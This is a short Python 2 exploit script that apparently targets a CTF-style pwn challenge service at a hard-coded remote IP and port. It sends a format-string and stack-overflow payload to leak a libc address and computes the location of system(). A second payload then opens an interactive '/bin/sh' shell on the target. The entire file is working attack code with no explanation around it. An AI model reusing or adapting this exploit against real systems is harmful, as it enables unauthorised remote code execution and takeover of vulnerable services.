from telnetlib import *

cout_addr = "\x60\x86\x04\x08"
std_addr = "\x00\xa1\x04\x08"
main_addr = "\x03\x88\x04\x08"
name_addr = "\x90\xa1\x04\x08"
atoi_addr = "\x28\xa0\x04\x08"

pwn = Telnet("140.113.209.24",11004)
#pwn = Telnet("127.0.0.1",5566)
raw_input("test")
print pwn.read_until("name:")
pwn.write("AAAA"+"%1$s"+"\x00"*12+"\x50\n001"+"a"*41+cout_addr+main_addr+std_addr+atoi_addr+"\n")
print pwn.read_until("AAAA")
print pwn.read_until("it?\n")
print pwn.read_until("day!")
aaa =  pwn.read_until("Welcome")
print hex(ord(aaa[1])),hex(ord(aaa[2])),hex(ord(aaa[3])),hex(ord(aaa[4]))
system_addr =  chr(ord(aaa[1])+0x30)+chr((ord(aaa[2])+0xe9)%256)+chr(ord(aaa[3])+1)+chr(ord(aaa[4]))
print hex(ord(system_addr[0])),hex(ord(system_addr[1])),hex(ord(system_addr[2])),hex(ord(system_addr[3]))
#print pwn.read_until("name:")

pwn.write("/bin//sh"+"\x00"*12 +"\xee001"+"a"*33+system_addr+main_addr+name_addr+"\x00"*4 )

print "\n[+]Now PWN interact!"
pwn.interact()
